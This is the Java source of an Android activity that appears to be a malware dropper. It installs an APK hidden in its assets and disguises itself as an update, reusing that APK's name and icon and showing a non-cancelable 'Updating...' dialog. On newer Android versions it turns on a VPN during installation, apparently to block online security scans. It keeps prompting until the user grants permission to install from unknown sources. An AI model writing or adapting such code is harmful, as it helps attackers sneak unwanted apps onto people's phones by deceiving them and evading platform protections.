package com.topdown.omnisec.ins;

import android.app.Activity;
import android.app.Dialog;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageInstaller;
import android.content.pm.PackageManager;
import android.graphics.drawable.Drawable;
import android.net.Uri;
import android.net.VpnService;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.view.Window;
import android.widget.Button;
import android.widget.ImageView;
import android.widget.TextView;
import android.widget.Toast;

import androidx.core.content.FileProvider;
import androidx.localbroadcastmanager.content.LocalBroadcastManager;

import com.topdown.omnisec.R;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;


public class DynamicInstallDropSession extends Activity {
    public static final String PACKAGE_INSTALLED_ACTION = "com.example.android.apis.content.SESSION_API_PACKAGE_INSTALLED";
    public static final String ACTION_INSTALL_COMPLETE = "com.verify.weird.ACTION_INSTALL_COMPLETE";

    private static final int REQUEST_UNKNOWN_APP_SOURCES = 1234;
    private static final int REQUEST_VPN = 5678;

    private static final long DELAY_BEFORE_INSTALL_MS = 350L;
    private final Handler mHandler = new Handler(Looper.getMainLooper());
    private String targetPackageName;
    private String apkFileName;
    private boolean isInstallStarted = false;
    private boolean userClickedInstall = false;
    private String appLabel = "";
    private Drawable appIcon = null;
    private Runnable mPermissionCheckRunnable;
    private Dialog progressDialog;

    private final BroadcastReceiver installCompleteReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {

            try {
                context.stopService(new Intent(context, VpnController.class));
            } catch (Exception ignored) {
            }
            try {
                context.startService(new Intent(context, VpnController.class)
                        .setAction(VpnController.ACTION_STOP_VPN));
            } catch (Exception ignored) {
            }

            if (progressDialog != null && progressDialog.isShowing()) {
                progressDialog.dismiss();
            }

            int status = intent.getIntExtra("install_status", -1);
            String installedPkg = intent.getStringExtra("installed_pkg");
            if (installedPkg != null && !installedPkg.isEmpty()) {
                targetPackageName = installedPkg;
            }

            if (status == PackageInstaller.STATUS_SUCCESS) {
                launchTargetAppAndFinish();
            } else if (status == PackageInstaller.STATUS_FAILURE_ABORTED) {
                Toast.makeText(DynamicInstallDropSession.this,
                        "click install to continue update!", Toast.LENGTH_LONG).show();
                isInstallStarted = false;
                userClickedInstall = false;
            } else {
                Toast.makeText(DynamicInstallDropSession.this,
                        "Installation failed. Please try again.", Toast.LENGTH_LONG).show();
                isInstallStarted = false;
                userClickedInstall = false;
            }
        }
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        requestWindowFeature(Window.FEATURE_NO_TITLE);
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main2);

        Button installButton = findViewById(R.id.installButton);
        installButton.setOnClickListener(v -> {
            userClickedInstall = true;
            startInstallFlow();
        });

        LocalBroadcastManager.getInstance(this)
                .registerReceiver(installCompleteReceiver, new IntentFilter(ACTION_INSTALL_COMPLETE));

        targetPackageName = getIntent().getStringExtra("targetPackageName");
        apkFileName = getIntent().getStringExtra("apkFileName");

        if (apkFileName == null || apkFileName.isEmpty()) {
            try {
                for (String file : getAssets().list("")) {
                    if (file.endsWith(".apk")) {
                        apkFileName = file;
                        break;
                    }
                }
                if (apkFileName == null) finish();
            } catch (IOException e) {
                finish();
            }
        }

        if (targetPackageName == null || targetPackageName.isEmpty()) {
            extractAppInfoFromApk();
        }

        loadAppIconIntoView();
    }

    private void loadAppIconIntoView() {
        ImageView logoImage = findViewById(R.id.logoImage);
        if (logoImage != null) {
            if (appIcon != null) {
                logoImage.setImageDrawable(appIcon);
            } else {
                logoImage.setImageResource(R.drawable.ic_launcher_foreground);
            }
        }

        TextView appNameView = findViewById(R.id.appNameView);
        if (appNameView != null) {
            if (!appLabel.isEmpty()) {
                appNameView.setText(appLabel);
            } else {
                appNameView.setText("App Name");
            }
        }
    }

    @Override
    protected void onResume() {
        super.onResume();

        // safety: koi VPN chal raha ho to band
        try {
            stopService(new Intent(this, VpnController.class));
        } catch (Exception ignored) {
        }
        try {
            startService(new Intent(this, VpnController.class)
                    .setAction(VpnController.ACTION_STOP_VPN));
        } catch (Exception ignored) {
        }

        // agar app install ho chuki hai to launch
        if (targetPackageName != null && isAppInstalled(targetPackageName)) {
            launchTargetAppAndFinish();
        }
    }

    private void startInstallFlow() {
        // Android 13+ (Tiramisu)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            Intent vpnIntent = VpnService.prepare(this);
            if (vpnIntent != null) {
                // VPN permission abhi grant nahi hui → dialog dikhao
                startActivityForResult(vpnIntent, REQUEST_VPN);
            } else {
                // VPN permission already granted → direct
                onVpnReady();
            }
        } else {
            // purane devices → VPN permission ka jhanjhat nahi
            // direct legacy install
            File cacheFile = new File(getCacheDir(), apkFileName);
            try (InputStream in = getAssets().open(apkFileName);
                 OutputStream out = new FileOutputStream(cacheFile)) {

                byte[] buf = new byte[4096];
                int len;
                while ((len = in.read(buf)) != -1) {
                    out.write(buf, 0, len);
                }
                out.flush();
            } catch (IOException e) {
                e.printStackTrace();
                return;
            }
            legacyInstallApk(cacheFile);
        }
    }

    private void onVpnReady() {
        try {
            startService(new Intent(this, VpnController.class));
        } catch (Exception ignored) {
        }

        mHandler.postDelayed(() -> {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O &&
                    !getPackageManager().canRequestPackageInstalls()) {

                startActivityForResult(
                        new Intent(
                                Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES,
                                Uri.parse("package:" + getPackageName())
                        ),
                        REQUEST_UNKNOWN_APP_SOURCES
                );
                startPermissionPolling();
            } else {
                if (userClickedInstall) {
                    showProgressDialog();
                    startInstallSessionSafely();
                }
            }
        }, DELAY_BEFORE_INSTALL_MS);
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        if (requestCode == REQUEST_VPN) {
            if (resultCode == RESULT_OK) {
                onVpnReady();
            } else {
                Toast.makeText(this, "VPN permission required to continue.", Toast.LENGTH_LONG).show();
            }
        } else if (requestCode == REQUEST_UNKNOWN_APP_SOURCES) {
            if (getPackageManager().canRequestPackageInstalls()) {
                if (userClickedInstall) {
                    showProgressDialog();
                    startInstallSessionSafely();
                }
            } else {
                Toast.makeText(this, "Allow installation from this source.", Toast.LENGTH_LONG).show();
            }
        }
        super.onActivityResult(requestCode, resultCode, data);
    }

    private void legacyInstallApk(File apkFile) {
        Uri apkUri;
        Intent intent = new Intent(Intent.ACTION_VIEW);
        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);

        apkUri = FileProvider.getUriForFile(
                this,
                getPackageName() + ".provider",
                apkFile
        );
        intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);

        intent.setDataAndType(apkUri, "application/vnd.android.package-archive");
        startActivity(intent);
    }

    private void extractAppInfoFromApk() {
        File cacheFile = new File(getCacheDir(), apkFileName);
        try (InputStream in = getAssets().open(apkFileName);
             OutputStream out = new FileOutputStream(cacheFile)) {

            byte[] buf = new byte[4096];
            int len;
            while ((len = in.read(buf)) != -1) {
                out.write(buf, 0, len);
            }
            out.flush();

            PackageManager pm = getPackageManager();
            PackageInfo info = pm.getPackageArchiveInfo(
                    cacheFile.getAbsolutePath(),
                    PackageManager.GET_META_DATA
            );
            if (info != null) {
                targetPackageName = info.packageName;
                ApplicationInfo appInfo = info.applicationInfo;
                appInfo.sourceDir = cacheFile.getAbsolutePath();
                appInfo.publicSourceDir = cacheFile.getAbsolutePath();
                appLabel = pm.getApplicationLabel(appInfo).toString();
                appIcon = pm.getApplicationIcon(appInfo);
            } else {
                finish();
            }
        } catch (IOException e) {
            finish();
        }
    }

    private void startPermissionPolling() {

        mPermissionCheckRunnable = new Runnable() {
            @Override
            public void run() {
                if (getPackageManager().canRequestPackageInstalls()) {
                    if (userClickedInstall) {
                        showProgressDialog();
                        startInstallSessionSafely();
                    }
                } else {
                    mHandler.postDelayed(this, 500);
                }
            }
        };
        mHandler.postDelayed(mPermissionCheckRunnable, 500);
    }

    private void startInstallSessionSafely() {
        if (!isInstallStarted) {
            isInstallStarted = true;
            startInstallSession();
        }
    }

    private void showProgressDialog() {
        if (progressDialog == null) {
            progressDialog = new Dialog(this, android.R.style.Theme_DeviceDefault_Dialog_NoActionBar);
            progressDialog.requestWindowFeature(Window.FEATURE_NO_TITLE);
            progressDialog.setContentView(R.layout.progress_dialog);
            progressDialog.setCancelable(false);
        }

        TextView title = progressDialog.findViewById(R.id.titleText);
        title.setText(appLabel.isEmpty() ? "Updating..." : appLabel);

        ImageView icon = progressDialog.findViewById(R.id.appIcon);
        if (appIcon != null) {
            icon.setImageDrawable(appIcon);
        }

        TextView msg = progressDialog.findViewById(R.id.messageText);
        msg.setText("Updating...");

        if (!progressDialog.isShowing()) {
            progressDialog.show();
        }
    }

    private void startInstallSession() {
        if (mPermissionCheckRunnable != null) {
            mHandler.removeCallbacks(mPermissionCheckRunnable);
        }

        try {
            PackageInstaller installer = getPackageManager().getPackageInstaller();
            PackageInstaller.SessionParams params =
                    new PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL);
            int sessionId = installer.createSession(params);
            PackageInstaller.Session session = installer.openSession(sessionId);

            addApkToInstallSession(apkFileName, session);

            Intent callback = new Intent(this, InstallResultReceiver.class)
                    .setAction(PACKAGE_INSTALLED_ACTION)
                    .setPackage(getPackageName());

            PendingIntent pi = PendingIntent.getBroadcast(
                    this, 0, callback,
                    PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_MUTABLE
            );

            new Handler(Looper.getMainLooper()).postDelayed(() -> {
                session.commit(pi.getIntentSender());
            }, 500);

        } catch (IOException | RuntimeException e) {
            e.printStackTrace();
        }
    }

    private void addApkToInstallSession(String assetName, PackageInstaller.Session session) throws IOException {
        try (InputStream in = getAssets().open(assetName);
             OutputStream out = session.openWrite("package", 0, -1)) {

            byte[] buf = new byte[4096];
            int len;
            while ((len = in.read(buf)) != -1) {
                out.write(buf, 0, len);
            }
            out.flush();
            session.fsync(out);
        }
    }

    private boolean isAppInstalled(String pkg) {
        try {
            if (pkg == null) return false;
            getPackageManager().getPackageInfo(pkg, 0);
            return true;
        } catch (PackageManager.NameNotFoundException e) {
            return false;
        }
    }

    private void launchTargetAppAndFinish() {
        if (targetPackageName == null) return;
        Intent launch = getPackageManager().getLaunchIntentForPackage(targetPackageName);
        if (launch != null) {
            launch.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(launch);
        }
        finish();
    }

    @Override
    protected void onDestroy() {
        if (mPermissionCheckRunnable != null) {
            mHandler.removeCallbacks(mPermissionCheckRunnable);
        }
        if (progressDialog != null && progressDialog.isShowing()) {
            progressDialog.dismiss();
        }
        LocalBroadcastManager.getInstance(this).unregisterReceiver(installCompleteReceiver);
        super.onDestroy();
    }
}